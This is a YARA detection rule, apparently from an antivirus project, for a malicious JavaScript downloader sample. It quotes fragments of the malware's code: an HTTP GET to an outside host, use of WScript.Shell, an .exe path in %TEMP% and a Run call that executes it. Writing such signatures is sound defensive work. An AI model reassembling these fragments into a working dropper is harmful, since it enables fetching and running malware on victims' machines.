rule sig_20160330_7f637f29ea9fe3c08cfa46839bf18ff5 {
  meta:
    description = "datamaliciousorder - file 20160330_7f637f29ea9fe3c08cfa46839bf18ff5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "26ef170e8c6bcaae77b15deecee74a49c169210050f01d5de6a880459c604228"

  strings:
    $s1  = "AF[G](\"GET\", \"http://a-ntsuhan.com/k38sav\", false);" fullword ascii
    $s2  = "function B(NI, J0){X0 = X0 * 1; return NI - J0;};" fullword ascii
    $s3  = "var UU = function A() {return WScript[MG](\"WScript\"+\".Shell\");}(), AE = 11;" fullword ascii
    $s4  = "if (AF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function X(){return SC + \"\";};" fullword ascii
    $s6  = "function T() {return UU[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"c2Tk5j2a5SvPcD.ex\" + \"e\";};" fullword ascii
    $s7  = "function V(F){UU[\"Run\"](F, X0, X0);};" fullword ascii
    $s8  = "function U() {return ((B0 == true) && (B0 == CB)) ? 1 : X0;};" fullword ascii
    $s9  = "var M = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (A0);" fullword ascii
    $s11 = "function TE()" fullword ascii
    $s12 = "function BJ(){return 22;};" fullword ascii
    $s13 = "return B(RA, F0);" fullword ascii
    $s14 = "function J(){return MG;};" fullword ascii
    $s15 = "function Y(CR) {var Q = (1, 2, 3, 4, 5, CR); return Q;};" fullword ascii
    $s16 = "var G0 = false;" fullword ascii
    $s17 = "var B0 = false;" fullword ascii
    $s18 = "B0 = true; " fullword ascii
    $s19 = "var CB = false;" fullword ascii
    $s20 = "CB = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}